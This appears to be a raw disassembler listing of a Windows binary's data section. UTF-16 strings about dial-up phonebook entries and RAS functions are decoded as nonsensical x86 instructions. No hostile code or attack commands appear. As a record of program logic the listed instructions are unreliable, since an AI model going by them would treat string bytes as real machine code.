  40171d:	add    BYTE PTR [esi+0x0],ch
  401720:	and    BYTE PTR [eax],al
  401722:	inc    esp
  401723:	add    BYTE PTR [ebp+0x0],ah
  401726:	jae    0x401728
  401728:	imul   eax,DWORD PTR [eax],0x74
  40172b:	add    BYTE PTR [edi+0x0],ch
  40172e:	jo     0x401730
  401730:	add    BYTE PTR [eax],al
  401732:	add    BYTE PTR [eax],al
  401734:	pop    esp
  401735:	add    BYTE PTR [eax+eax*1+0x65],al
  401739:	add    BYTE PTR [ebx+0x0],dh
  40173c:	imul   eax,DWORD PTR [eax],0x74
  40173f:	add    BYTE PTR [edi+0x0],ch
  401742:	jo     0x401744
  401744:	add    BYTE PTR [eax],al
  401746:	add    BYTE PTR [eax],al
  401748:	and    eax,0x25007300
  40174d:	add    BYTE PTR [ebx+0x0],dh
  401750:	and    eax,0x25007300
  401755:	add    BYTE PTR [ebx+0x0],dh
	...
  401760:	pop    esp
  401761:	add    BYTE PTR [ebp+0x0],cl
  401764:	imul   eax,DWORD PTR [eax],0x720063
  40176a:	outs   dx,DWORD PTR ds:[esi]
  40176b:	add    BYTE PTR [ebx+0x0],dh
  40176e:	outs   dx,DWORD PTR ds:[esi]
  40176f:	add    BYTE PTR [esi+0x0],ah
  401772:	je     0x401774
  401774:	pop    esp
  401775:	add    BYTE PTR [esi+0x0],cl
  401778:	add    BYTE PTR gs:[eax+eax*1+0x77],dh
  40177d:	add    BYTE PTR [edi+0x0],ch
  401780:	jb     0x401782
  401782:	imul   eax,DWORD PTR [eax],0x5c
  401785:	add    BYTE PTR [ebx+0x0],al
  401788:	outs   dx,DWORD PTR ds:[esi]
  401789:	add    BYTE PTR [esi+0x0],ch
  40178c:	outs   dx,BYTE PTR ds:[esi]
  40178d:	add    BYTE PTR [ebp+0x0],ah
  401790:	arpl   WORD PTR [eax],ax
  401792:	je     0x401794
  401794:	imul   eax,DWORD PTR [eax],0x6e006f
  40179a:	jae    0x40179c
  40179c:	pop    esp
  40179d:	add    BYTE PTR [ebx+0x0],al
  4017a0:	ins    DWORD PTR es:[edi],dx
  4017a1:	add    BYTE PTR [eax],al
  4017a3:	add    BYTE PTR [edx+0x0],dl
  4017a6:	jne    0x4017a8
  4017a8:	outs   dx,BYTE PTR ds:[esi]
  4017a9:	add    BYTE PTR [eax+0x0],dl
  4017ac:	outs   dx,DWORD PTR ds:[esi]
  4017ad:	add    BYTE PTR [ebx+0x0],dh
  4017b0:	je     0x4017b2
  4017b2:	push   ebx
  4017b3:	add    BYTE PTR [ebp+0x0],ah
  4017b6:	je     0x4017b8
  4017b8:	jne    0x4017ba
  4017ba:	jo     0x4017bc
  4017bc:	inc    ebx
  4017bd:	add    BYTE PTR [edi+0x0],ch
  4017c0:	ins    DWORD PTR es:[edi],dx
  4017c1:	add    BYTE PTR [ebp+0x0],ch
  4017c4:	popa   
  4017c5:	add    BYTE PTR [esi+0x0],ch
  4017c8:	add    BYTE PTR fs:[ebx+0x0],dh
  4017cc:	push   ebx
  4017cd:	add    BYTE PTR [ebp+0x0],ah
  4017d0:	arpl   WORD PTR [eax],ax
  4017d2:	je     0x4017d4
  4017d4:	imul   eax,DWORD PTR [eax],0x6e006f
  4017da:	add    BYTE PTR [eax],al
  4017dc:	jae    0x4017de
  4017de:	push   0x77006f00
  4017e3:	add    BYTE PTR [ecx+0x0],ch
  4017e6:	arpl   WORD PTR [eax],ax
  4017e8:	outs   dx,DWORD PTR ds:[esi]
  4017e9:	add    BYTE PTR [esi+0x0],ch
  4017ec:	add    BYTE PTR cs:[ebp+0x0],ah
  4017f0:	js     0x4017f2
  4017f2:	add    BYTE PTR gs:[eax],al
  4017f5:	add    BYTE PTR [eax],al
  4017f7:	add    BYTE PTR [edx+0x0],dl
  4017fa:	add    BYTE PTR gs:[ebp+0x0],ch
  4017fe:	outs   dx,DWORD PTR ds:[esi]
  4017ff:	add    BYTE PTR [esi+0x0],dh
  401802:	add    BYTE PTR gs:[eax+0x0],dl
  401806:	push   0x6e006f00
  40180b:	add    BYTE PTR [ebp+0x0],ah
  40180e:	bound  eax,QWORD PTR [eax]
  401810:	outs   dx,DWORD PTR ds:[esi]
  401811:	add    BYTE PTR [edi+0x0],ch
  401814:	imul   eax,DWORD PTR [eax],0x45
  401817:	add    BYTE PTR [esi+0x0],ch
  40181a:	je     0x40181c
  40181c:	jb     0x40181e
  40181e:	jns    0x401820
  401820:	and    BYTE PTR [eax],al
  401822:	sub    eax,0x20002d00
  401827:	add    BYTE PTR [ecx+0x0],cl
  40182a:	outs   dx,BYTE PTR ds:[esi]
  40182b:	add    BYTE PTR [esi+0x0],dh
  40182e:	popa   
  40182f:	add    BYTE PTR [eax+eax*1+0x69],ch
  401833:	add    BYTE PTR [eax+eax*1+0x20],ah
  401837:	add    BYTE PTR [eax+0x0],dl
  40183a:	popa   
  40183b:	add    BYTE PTR [edx+0x0],dh
  40183e:	popa   
  40183f:	add    BYTE PTR [ebp+0x0],ch
  401842:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  401847:	add    BYTE PTR [edx+0x0],dh
  40184a:	and    BYTE PTR [eax],al
  40184c:	jo     0x40184e
  40184e:	popa   
  40184f:	add    BYTE PTR [ebx+0x0],dh
  401852:	jae    0x401854
  401854:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  401859:	add    BYTE PTR [ecx+0x0],ch
  40185c:	outs   dx,BYTE PTR ds:[esi]
  40185d:	add    BYTE PTR [esi],ch
	...
  401867:	add    BYTE PTR [edx+0x0],dl
  40186a:	add    BYTE PTR gs:[ebp+0x0],ch
  40186e:	outs   dx,DWORD PTR ds:[esi]
  40186f:	add    BYTE PTR [esi+0x0],dh
  401872:	add    BYTE PTR gs:[eax+0x0],dl
  401876:	push   0x6e006f00
  40187b:	add    BYTE PTR [ebp+0x0],ah
  40187e:	bound  eax,QWORD PTR [eax]
  401880:	outs   dx,DWORD PTR ds:[esi]
  401881:	add    BYTE PTR [edi+0x0],ch
  401884:	imul   eax,DWORD PTR [eax],0x45
  401887:	add    BYTE PTR [esi+0x0],ch
  40188a:	je     0x40188c
  40188c:	jb     0x40188e
  40188e:	jns    0x401890
  401890:	and    BYTE PTR [eax],al
  401892:	sub    eax,0x20002d00
  401897:	add    BYTE PTR [ebp+0x0],dl
  40189a:	outs   dx,BYTE PTR ds:[esi]
  40189b:	add    BYTE PTR [ecx+0x0],ah
  40189e:	bound  eax,QWORD PTR [eax]
  4018a0:	ins    BYTE PTR es:[edi],dx
  4018a1:	add    BYTE PTR [ebp+0x0],ah
  4018a4:	and    BYTE PTR [eax],al
  4018a6:	je     0x4018a8
  4018a8:	outs   dx,DWORD PTR ds:[esi]
  4018a9:	add    BYTE PTR [eax],ah
  4018ab:	add    BYTE PTR [edi+0x0],ah
  4018ae:	add    BYTE PTR gs:[eax+eax*1+0x20],dh
  4018b3:	add    BYTE PTR [edx+0x0],dl
  4018b6:	inc    ecx
  4018b7:	add    BYTE PTR [ebx+0x0],dl
  4018ba:	and    BYTE PTR [eax],al
  4018bc:	popa   
  4018bd:	add    BYTE PTR [eax+0x0],dh
  4018c0:	imul   eax,DWORD PTR [eax],0x2e0073
  4018c6:	add    BYTE PTR [eax],al
  4018c8:	push   edx
  4018c9:	add    BYTE PTR [ebp+0x0],ah
  4018cc:	ins    DWORD PTR es:[edi],dx
  4018cd:	add    BYTE PTR [edi+0x0],ch
  4018d0:	jbe    0x4018d2
  4018d2:	add    BYTE PTR gs:[eax+0x0],dl
  4018d6:	push   0x6e006f00
  4018db:	add    BYTE PTR [ebp+0x0],ah
  4018de:	bound  eax,QWORD PTR [eax]
  4018e0:	outs   dx,DWORD PTR ds:[esi]
  4018e1:	add    BYTE PTR [edi+0x0],ch
  4018e4:	imul   eax,DWORD PTR [eax],0x45
  4018e7:	add    BYTE PTR [esi+0x0],ch
  4018ea:	je     0x4018ec
  4018ec:	jb     0x4018ee
  4018ee:	jns    0x4018f0
  4018f0:	and    BYTE PTR [eax],al
  4018f2:	sub    eax,0x20002d00
  4018f7:	add    BYTE PTR [edx+0x0],dl
  4018fa:	popa   
  4018fb:	add    BYTE PTR [ebx+0x0],dh
  4018fe:	inc    ebp
  4018ff:	add    BYTE PTR [esi+0x0],ch
  401902:	jne    0x401904
  401904:	ins    DWORD PTR es:[edi],dx
  401905:	add    BYTE PTR [ebp+0x0],al
  401908:	outs   dx,BYTE PTR ds:[esi]
  401909:	add    BYTE PTR [eax+eax*1+0x72],dh
  40190d:	add    BYTE PTR [ecx+0x0],ch
  401910:	add    BYTE PTR gs:[ebx+0x0],dh
  401914:	and    BYTE PTR [eax],al
  401916:	jae    0x401918
  401918:	popa   
  401919:	add    BYTE PTR [ecx+0x0],ch
  40191c:	add    BYTE PTR fs:[eax],ah
  40191f:	add    BYTE PTR [edi+0x0],ch
  401922:	jne    0x401924
  401924:	jb     0x401926
  401926:	and    BYTE PTR [eax],al
  401928:	bound  eax,QWORD PTR [eax]
  40192a:	jne    0x40192c
  40192c:	data16 add BYTE PTR [esi+0x0],ah
  401930:	add    BYTE PTR gs:[edx+0x0],dh
  401934:	and    BYTE PTR [eax],al
  401936:	ja     0x401938
  401938:	popa   
  401939:	add    BYTE PTR [ebx+0x0],dh
  40193c:	and    BYTE PTR [eax],al
  40193e:	je     0x401940
  401940:	outs   dx,DWORD PTR ds:[esi]
  401941:	add    BYTE PTR [edi+0x0],ch
  401944:	and    BYTE PTR [eax],al
  401946:	jae    0x401948
  401948:	ins    DWORD PTR es:[edi],dx
  401949:	add    BYTE PTR [ecx+0x0],ah
  40194c:	ins    BYTE PTR es:[edi],dx
  40194d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  401951:	add    BYTE PTR [eax],ah
  401953:	add    BYTE PTR [esi+0x0],cl
  401956:	add    BYTE PTR gs:[edi+0x0],dh
  40195a:	and    BYTE PTR [eax],al
  40195c:	push   ebx
  40195d:	add    BYTE PTR [ecx+0x0],ch
  401960:	jp     0x401962
  401962:	add    BYTE PTR gs:0x75002500,bh
  401969:	add    BYTE PTR [eax],al
  40196b:	add    BYTE PTR [eax],al
  40196d:	add    BYTE PTR [eax],al
  40196f:	add    BYTE PTR [edx+0x0],dl
  401972:	add    BYTE PTR gs:[ebp+0x0],ch
  401976:	outs   dx,DWORD PTR ds:[esi]
  401977:	add    BYTE PTR [esi+0x0],dh
  40197a:	add    BYTE PTR gs:[eax+0x0],dl
  40197e:	push   0x6e006f00
  401983:	add    BYTE PTR [ebp+0x0],ah
  401986:	bound  eax,QWORD PTR [eax]
  401988:	outs   dx,DWORD PTR ds:[esi]
  401989:	add    BYTE PTR [edi+0x0],ch
  40198c:	imul   eax,DWORD PTR [eax],0x45
  40198f:	add    BYTE PTR [esi+0x0],ch
  401992:	je     0x401994
  401994:	jb     0x401996
  401996:	jns    0x401998
  401998:	and    BYTE PTR [eax],al
  40199a:	sub    eax,0x20002d00
  40199f:	add    BYTE PTR [edx+0x0],dl
  4019a2:	popa   
  4019a3:	add    BYTE PTR [ebx+0x0],dh
  4019a6:	inc    ebp
  4019a7:	add    BYTE PTR [esi+0x0],ch
  4019aa:	jne    0x4019ac
  4019ac:	ins    DWORD PTR es:[edi],dx
  4019ad:	add    BYTE PTR [ebp+0x0],al
  4019b0:	outs   dx,BYTE PTR ds:[esi]
  4019b1:	add    BYTE PTR [eax+eax*1+0x72],dh
  4019b5:	add    BYTE PTR [ecx+0x0],ch
  4019b8:	add    BYTE PTR gs:[ebx+0x0],dh
  4019bc:	and    BYTE PTR [eax],al
  4019be:	jae    0x4019c0
  4019c0:	jne    0x4019c2
  4019c2:	arpl   WORD PTR [eax],ax
  4019c4:	arpl   WORD PTR [eax],ax
  4019c6:	add    BYTE PTR gs:[ebx+0x0],dh
  4019ca:	jae    0x4019cc
  4019cc:	data16 add BYTE PTR [ebp+0x0],dh
  4019d0:	ins    BYTE PTR es:[edi],dx
  4019d1:	add    BYTE PTR [eax+eax*1],ch
  4019d4:	and    BYTE PTR [eax],al
  4019d6:	and    eax,0x20007500
  4019db:	add    BYTE PTR [ebp+0x0],ah
  4019de:	outs   dx,BYTE PTR ds:[esi]
  4019df:	add    BYTE PTR [eax+eax*1+0x72],dh
  4019e3:	add    BYTE PTR [ecx+0x0],ch
  4019e6:	add    BYTE PTR gs:[ebx+0x0],dh
  4019ea:	and    BYTE PTR [eax],al
  4019ec:	add    BYTE PTR gs:[esi+0x0],ch
  4019f0:	jne    0x4019f2
  4019f2:	ins    DWORD PTR es:[edi],dx
  4019f3:	add    BYTE PTR [ebp+0x0],ah
  4019f6:	jb     0x4019f8
  4019f8:	popa   
  4019f9:	add    BYTE PTR [eax+eax*1+0x65],dh
  4019fd:	add    BYTE PTR [eax+eax*1+0x2e],ah
  401a01:	add    BYTE PTR [eax],al
  401a03:	add    BYTE PTR [eax],al
  401a05:	add    BYTE PTR [eax],al
  401a07:	add    BYTE PTR [edx+0x0],dl
  401a0a:	add    BYTE PTR gs:[ebp+0x0],ch
  401a0e:	outs   dx,DWORD PTR ds:[esi]
  401a0f:	add    BYTE PTR [esi+0x0],dh
  401a12:	add    BYTE PTR gs:[eax+0x0],dl
  401a16:	push   0x6e006f00
  401a1b:	add    BYTE PTR [ebp+0x0],ah
  401a1e:	bound  eax,QWORD PTR [eax]
  401a20:	outs   dx,DWORD PTR ds:[esi]
  401a21:	add    BYTE PTR [edi+0x0],ch
  401a24:	imul   eax,DWORD PTR [eax],0x45
  401a27:	add    BYTE PTR [esi+0x0],ch
  401a2a:	je     0x401a2c
  401a2c:	jb     0x401a2e
  401a2e:	jns    0x401a30
  401a30:	and    BYTE PTR [eax],al
  401a32:	sub    eax,0x20002d00
  401a37:	add    BYTE PTR [edx+0x0],dl
  401a3a:	popa   
  401a3b:	add    BYTE PTR [ebx+0x0],dh
  401a3e:	inc    ebp
  401a3f:	add    BYTE PTR [esi+0x0],ch
  401a42:	jne    0x401a44
  401a44:	ins    DWORD PTR es:[edi],dx
  401a45:	add    BYTE PTR [ebp+0x0],al
  401a48:	outs   dx,BYTE PTR ds:[esi]
  401a49:	add    BYTE PTR [eax+eax*1+0x72],dh
  401a4d:	add    BYTE PTR [ecx+0x0],ch
  401a50:	add    BYTE PTR gs:[ebx+0x0],dh
  401a54:	and    BYTE PTR [eax],al
  401a56:	inc    esi
  401a57:	add    BYTE PTR [ecx+0x0],ah
  401a5a:	imul   eax,DWORD PTR [eax],0x65006c
  401a60:	add    BYTE PTR fs:[eax+eax*1],ch
  401a64:	and    BYTE PTR [eax],al
  401a66:	add    BYTE PTR fs:[edi+0x0],dh
  401a6a:	push   edx
  401a6b:	add    BYTE PTR [ebp+0x0],ah
  401a6e:	je     0x401a70
  401a70:	and    BYTE PTR [eax],al
  401a72:	cmp    eax,0x20003d00
  401a77:	add    BYTE PTR ds:0x7500,ah
  401a7d:	add    BYTE PTR [eax],al
  401a7f:	add    BYTE PTR [eax],ch
  401a81:	add    BYTE PTR [esi+0x0],ch
  401a84:	jne    0x401a86
  401a86:	ins    BYTE PTR es:[edi],dx
  401a87:	add    BYTE PTR [eax+eax*1+0x29],ch
  401a8b:	add    BYTE PTR [eax],al
  401a8d:	add    BYTE PTR [eax],al
  401a8f:	add    BYTE PTR [ecx],cl
  401a91:	add    BYTE PTR [edx+0x0],dl
  401a94:	add    BYTE PTR gs:[ebp+0x0],ch
  401a98:	outs   dx,DWORD PTR ds:[esi]
  401a99:	add    BYTE PTR [esi+0x0],dh
  401a9c:	add    BYTE PTR gs:[eax+0x0],dl
  401aa0:	push   0x6e006f00
  401aa5:	add    BYTE PTR [ebp+0x0],ah
  401aa8:	bound  eax,QWORD PTR [eax]
  401aaa:	outs   dx,DWORD PTR ds:[esi]
  401aab:	add    BYTE PTR [edi+0x0],ch
  401aae:	imul   eax,DWORD PTR [eax],0x45
  401ab1:	add    BYTE PTR [esi+0x0],ch
  401ab4:	je     0x401ab6
  401ab6:	jb     0x401ab8
  401ab8:	jns    0x401aba
  401aba:	and    BYTE PTR [eax],al
  401abc:	sub    eax,0x20002d00
  401ac1:	add    BYTE PTR [edx+0x0],dl
  401ac4:	popa   
  401ac5:	add    BYTE PTR [ebx+0x0],dh
  401ac8:	inc    ebp
  401ac9:	add    BYTE PTR [esi+0x0],ch
  401acc:	jne    0x401ace
  401ace:	ins    DWORD PTR es:[edi],dx
  401acf:	add    BYTE PTR [ebp+0x0],al
  401ad2:	outs   dx,BYTE PTR ds:[esi]
  401ad3:	add    BYTE PTR [eax+eax*1+0x72],dh
  401ad7:	add    BYTE PTR [ecx+0x0],ch
  401ada:	add    BYTE PTR gs:[ebx+0x0],dh
  401ade:	and    BYTE PTR [eax],al
  401ae0:	jb     0x401ae2
  401ae2:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  401ae7:	add    BYTE PTR [edx+0x0],dh
  401aea:	outs   dx,BYTE PTR ds:[esi]
  401aeb:	add    BYTE PTR [ebp+0x0],ah
  401aee:	add    BYTE PTR fs:[eax],ah
  401af1:	add    BYTE PTR ds:0x20007300,ah
  401af7:	add    BYTE PTR [ecx+0x0],ch
  401afa:	outs   dx,BYTE PTR ds:[esi]
  401afb:	add    BYTE PTR [eax],ah
  401afd:	add    BYTE PTR ds:0x7300,ah
  401b03:	add    BYTE PTR [eax],al
  401b05:	add    BYTE PTR [eax],al
  401b07:	add    BYTE PTR [ecx],cl
  401b09:	add    BYTE PTR [ecx],cl
  401b0b:	add    BYTE PTR [edx+0x0],dl
  401b0e:	add    BYTE PTR gs:[ebp+0x0],ch
  401b12:	outs   dx,DWORD PTR ds:[esi]
  401b13:	add    BYTE PTR [esi+0x0],dh
  401b16:	add    BYTE PTR gs:[eax+0x0],dl
  401b1a:	push   0x6e006f00
  401b1f:	add    BYTE PTR [ebp+0x0],ah
  401b22:	bound  eax,QWORD PTR [eax]
  401b24:	outs   dx,DWORD PTR ds:[esi]
  401b25:	add    BYTE PTR [edi+0x0],ch
  401b28:	imul   eax,DWORD PTR [eax],0x45
  401b2b:	add    BYTE PTR [esi+0x0],ch
  401b2e:	je     0x401b30
  401b30:	jb     0x401b32
  401b32:	jns    0x401b34
  401b34:	and    BYTE PTR [eax],al
  401b36:	sub    eax,0x20002d00
  401b3b:	add    BYTE PTR [edx+0x0],dl
  401b3e:	popa   
  401b3f:	add    BYTE PTR [ebx+0x0],dh
  401b42:	push   ebx
  401b43:	add    BYTE PTR [ebp+0x0],ah
  401b46:	je     0x401b48
  401b48:	inc    ebp
  401b49:	add    BYTE PTR [esi+0x0],ch
  401b4c:	je     0x401b4e
  401b4e:	jb     0x401b50
  401b50:	jns    0x401b52
  401b52:	push   eax
  401b53:	add    BYTE PTR [edx+0x0],dh
  401b56:	outs   dx,DWORD PTR ds:[esi]
  401b57:	add    BYTE PTR [eax+0x0],dh
  401b5a:	add    BYTE PTR gs:[edx+0x0],dh
  401b5e:	je     0x401b60
  401b60:	imul   eax,DWORD PTR [eax],0x730065
  401b66:	and    BYTE PTR [eax],al
  401b68:	data16 add BYTE PTR [ecx+0x0],ah
  401b6c:	imul   eax,DWORD PTR [eax],0x65006c
  401b72:	add    BYTE PTR fs:[eax],ah
  401b75:	add    BYTE PTR [edi+0x0],ch
  401b78:	outs   dx,BYTE PTR ds:[esi]
  401b79:	add    BYTE PTR [eax],ah
  401b7b:	add    BYTE PTR [ebp+0x0],ah
  401b7e:	outs   dx,BYTE PTR ds:[esi]
  401b7f:	add    BYTE PTR [eax+eax*1+0x72],dh
  401b83:	add    BYTE PTR [ecx+0x0],bh
  401b86:	and    BYTE PTR [eax],al
  401b88:	and    eax,0x20007300
  401b8d:	add    BYTE PTR [ecx+0x0],ch
  401b90:	outs   dx,BYTE PTR ds:[esi]
  401b91:	add    BYTE PTR [eax],ah
  401b93:	add    BYTE PTR ds:0x2c007300,ah
  401b99:	add    BYTE PTR [eax],ah
  401b9b:	add    BYTE PTR [eax+eax*1+0x77],ah
  401b9f:	add    BYTE PTR [edx+0x0],dl
  401ba2:	add    BYTE PTR gs:[eax+eax*1+0x20],dh
  401ba7:	add    BYTE PTR ds:0x25002000,bh
  401bad:	add    BYTE PTR [ebp+0x0],dh
	...
  401bb8:	or     DWORD PTR [eax],eax
  401bba:	or     DWORD PTR [eax],eax
  401bbc:	push   edx
  401bbd:	add    BYTE PTR [ebp+0x0],ah
  401bc0:	ins    DWORD PTR es:[edi],dx
  401bc1:	add    BYTE PTR [edi+0x0],ch
  401bc4:	jbe    0x401bc6
  401bc6:	add    BYTE PTR gs:[eax+0x0],dl
  401bca:	push   0x6e006f00
  401bcf:	add    BYTE PTR [ebp+0x0],ah
  401bd2:	bound  eax,QWORD PTR [eax]
  401bd4:	outs   dx,DWORD PTR ds:[esi]
  401bd5:	add    BYTE PTR [edi+0x0],ch
  401bd8:	imul   eax,DWORD PTR [eax],0x45
  401bdb:	add    BYTE PTR [esi+0x0],ch
  401bde:	je     0x401be0
  401be0:	jb     0x401be2
  401be2:	jns    0x401be4
  401be4:	and    BYTE PTR [eax],al
  401be6:	sub    eax,0x20002d00
  401beb:	add    BYTE PTR [ebx+0x0],al
  401bee:	ins    BYTE PTR es:[edi],dx
  401bef:	add    BYTE PTR [ebp+0x0],ah
  401bf2:	popa   
  401bf3:	add    BYTE PTR [edx+0x0],dh
  401bf6:	imul   eax,DWORD PTR [eax],0x67006e
  401bfc:	and    BYTE PTR [eax],al
  401bfe:	inc    ebx
  401bff:	add    BYTE PTR [ebp+0x0],dh
  401c02:	jae    0x401c04
  401c04:	je     0x401c06
  401c06:	outs   dx,DWORD PTR ds:[esi]
  401c07:	add    BYTE PTR [ebp+0x0],ch
  401c0a:	inc    esp
  401c0b:	add    BYTE PTR [ecx+0x0],ch
  401c0e:	popa   
  401c0f:	add    BYTE PTR [eax+eax*1+0x44],ch
  401c13:	add    BYTE PTR [eax+eax*1+0x6c],ch
  401c17:	add    BYTE PTR [eax],ah
  401c19:	add    BYTE PTR [ebx+0x0],dh
  401c1c:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  401c21:	add    BYTE PTR [ecx+0x0],ch
  401c24:	outs   dx,BYTE PTR ds:[esi]
  401c25:	add    BYTE PTR [edi+0x0],ah
  401c28:	and    BYTE PTR [eax],al
  401c2a:	ja     0x401c2c
  401c2c:	imul   eax,DWORD PTR [eax],0x680074
  401c32:	and    BYTE PTR [eax],al
  401c34:	push   edx
  401c35:	add    BYTE PTR [ecx+0x0],ah
  401c38:	jae    0x401c3a
  401c3a:	push   ebx
  401c3b:	add    BYTE PTR [ebp+0x0],ah
  401c3e:	je     0x401c40
  401c40:	inc    ebp
  401c41:	add    BYTE PTR [esi+0x0],ch
  401c44:	je     0x401c46
  401c46:	jb     0x401c48
  401c48:	jns    0x401c4a
  401c4a:	push   eax
  401c4b:	add    BYTE PTR [edx+0x0],dh
  401c4e:	outs   dx,DWORD PTR ds:[esi]
  401c4f:	add    BYTE PTR [eax+0x0],dh
  401c52:	add    BYTE PTR gs:[edx+0x0],dh
  401c56:	je     0x401c58
  401c58:	imul   eax,DWORD PTR [eax],0x730065
  401c5e:	and    BYTE PTR [eax],al
  401c60:	outs   dx,DWORD PTR ds:[esi]
  401c61:	add    BYTE PTR [esi+0x0],ch
  401c64:	and    BYTE PTR [eax],al
  401c66:	add    BYTE PTR gs:[esi+0x0],ch
  401c6a:	je     0x401c6c
  401c6c:	jb     0x401c6e
  401c6e:	jns    0x401c70
  401c70:	and    BYTE PTR [eax],al
  401c72:	and    eax,0x20007300
  401c77:	add    BYTE PTR [ecx+0x0],ch
  401c7a:	outs   dx,BYTE PTR ds:[esi]
  401c7b:	add    BYTE PTR [eax],ah
  401c7d:	add    BYTE PTR ds:0x7300,ah
  401c83:	add    BYTE PTR [eax],al
  401c85:	add    BYTE PTR [eax],al
  401c87:	add    BYTE PTR [ecx],cl
  401c89:	add    BYTE PTR [ecx],cl
  401c8b:	add    BYTE PTR [edx+0x0],dl
  401c8e:	add    BYTE PTR gs:[ebp+0x0],ch
  401c92:	outs   dx,DWORD PTR ds:[esi]
  401c93:	add    BYTE PTR [esi+0x0],dh
  401c96:	add    BYTE PTR gs:[eax+0x0],dl
  401c9a:	push   0x6e006f00
  401c9f:	add    BYTE PTR [ebp+0x0],ah
  401ca2:	bound  eax,QWORD PTR [eax]
  401ca4:	outs   dx,DWORD PTR ds:[esi]
  401ca5:	add    BYTE PTR [edi+0x0],ch
  401ca8:	imul   eax,DWORD PTR [eax],0x45
  401cab:	add    BYTE PTR [esi+0x0],ch
  401cae:	je     0x401cb0
  401cb0:	jb     0x401cb2
  401cb2:	jns    0x401cb4
  401cb4:	and    BYTE PTR [eax],al
  401cb6:	sub    eax,0x20002d00
  401cbb:	add    BYTE PTR [edx+0x0],dl
  401cbe:	popa   
  401cbf:	add    BYTE PTR [ebx+0x0],dh
  401cc2:	inc    esp
  401cc3:	add    BYTE PTR [ebp+0x0],ah
  401cc6:	ins    BYTE PTR es:[edi],dx
  401cc7:	add    BYTE PTR [ebp+0x0],ah
  401cca:	je     0x401ccc
  401ccc:	add    BYTE PTR gs:[ebp+0x0],al
  401cd0:	outs   dx,BYTE PTR ds:[esi]
  401cd1:	add    BYTE PTR [eax+eax*1+0x72],dh
  401cd5:	add    BYTE PTR [ecx+0x0],bh
  401cd8:	and    BYTE PTR [eax],al
  401cda:	data16 add BYTE PTR [ecx+0x0],ah
  401cde:	imul   eax,DWORD PTR [eax],0x65006c
  401ce4:	add    BYTE PTR fs:[eax],ah
  401ce7:	add    BYTE PTR [edi+0x0],ch
  401cea:	outs   dx,BYTE PTR ds:[esi]
  401ceb:	add    BYTE PTR [eax],ah
  401ced:	add    BYTE PTR [ebp+0x0],ah
  401cf0:	outs   dx,BYTE PTR ds:[esi]
  401cf1:	add    BYTE PTR [eax+eax*1+0x72],dh
  401cf5:	add    BYTE PTR [ecx+0x0],bh
  401cf8:	and    BYTE PTR [eax],al
  401cfa:	and    eax,0x20007300
  401cff:	add    BYTE PTR [ecx+0x0],ch
  401d02:	outs   dx,BYTE PTR ds:[esi]
  401d03:	add    BYTE PTR [eax],ah
  401d05:	add    BYTE PTR ds:0x2c007300,ah
  401d0b:	add    BYTE PTR [eax],ah
  401d0d:	add    BYTE PTR [eax+eax*1+0x77],ah
  401d11:	add    BYTE PTR [edx+0x0],dl
  401d14:	add    BYTE PTR gs:[eax+eax*1+0x20],dh
  401d19:	add    BYTE PTR ds:0x25002000,bh
  401d1f:	add    BYTE PTR [ebp+0x0],dh
  401d22:	add    BYTE PTR [eax],al
  401d24:	add    BYTE PTR [eax],al
  401d26:	add    BYTE PTR [eax],al
  401d28:	or     DWORD PTR [eax],eax
  401d2a:	or     DWORD PTR [eax],eax
  401d2c:	push   edx
  401d2d:	add    BYTE PTR [ebp+0x0],ah
  401d30:	ins    DWORD PTR es:[edi],dx
  401d31:	add    BYTE PTR [edi+0x0],ch
  401d34:	jbe    0x401d36
  401d36:	add    BYTE PTR gs:[eax+0x0],dl
  401d3a:	push   0x6e006f00
  401d3f:	add    BYTE PTR [ebp+0x0],ah
  401d42:	bound  eax,QWORD PTR [eax]
  401d44:	outs   dx,DWORD PTR ds:[esi]
  401d45:	add    BYTE PTR [edi+0x0],ch
  401d48:	imul   eax,DWORD PTR [eax],0x45
  401d4b:	add    BYTE PTR [esi+0x0],ch
  401d4e:	je     0x401d50
  401d50:	jb     0x401d52
  401d52:	jns    0x401d54
  401d54:	and    BYTE PTR [eax],al
  401d56:	sub    eax,0x20002d00
  401d5b:	add    BYTE PTR [eax+eax*1+0x65],al
  401d5f:	add    BYTE PTR [eax+eax*1+0x65],ch
  401d63:	add    BYTE PTR [eax+eax*1+0x65],dh
  401d67:	add    BYTE PTR [eax+eax*1+0x20],ah
  401d6b:	add    BYTE PTR [ebp+0x0],ah
  401d6e:	outs   dx,BYTE PTR ds:[esi]
  401d6f:	add    BYTE PTR [eax+eax*1+0x72],dh
  401d73:	add    BYTE PTR [ecx+0x0],bh
  401d76:	and    BYTE PTR [eax],al
  401d78:	and    eax,0x20007300
  401d7d:	add    BYTE PTR [ecx+0x0],ch
  401d80:	outs   dx,BYTE PTR ds:[esi]
  401d81:	add    BYTE PTR [eax],ah
  401d83:	add    BYTE PTR ds:0x7300,ah
  401d89:	add    BYTE PTR [eax],al
  401d8b:	add    BYTE PTR ds:0x5c007300,ah
  401d91:	add    BYTE PTR ds:0x20007300,ah
  401d97:	add    BYTE PTR ds:0x25002000,ch
  401d9d:	add    BYTE PTR [ebx+0x0],dh
  401da0:	add    BYTE PTR cs:[eax+eax*1+0x6e],ch
  401da5:	add    BYTE PTR [ebx+0x0],ch
  401da8:	add    BYTE PTR [eax],al
  401daa:	add    BYTE PTR [eax],al
  401dac:	and    eax,0x5c007300
  401db1:	add    BYTE PTR ds:0x20007300,ah
  401db7:	add    BYTE PTR ds:0x2e007300,ah
  401dbd:	add    BYTE PTR [eax+eax*1+0x6e],ch
  401dc1:	add    BYTE PTR [ebx+0x0],ch
  401dc4:	add    BYTE PTR [eax],al
  401dc6:	add    BYTE PTR [eax],al
  401dc8:	inc    ebx
  401dc9:	add    BYTE PTR [edx+0x0],dh
  401dcc:	add    BYTE PTR gs:[ecx+0x0],ah
  401dd0:	je     0x401dd2
  401dd2:	add    BYTE PTR gs:[esi+0x0],cl
  401dd6:	push   esp
  401dd7:	add    BYTE PTR ds:0x72005000,dh
  401ddd:	add    BYTE PTR [edi+0x0],ch
  401de0:	data16 add BYTE PTR [ecx+0x0],ch
  401de4:	ins    BYTE PTR es:[edi],dx
  401de5:	add    BYTE PTR [ebp+0x0],ah
  401de8:	push   ebx
  401de9:	add    BYTE PTR [eax+0x0],ch
  401dec:	outs   dx,DWORD PTR ds:[esi]
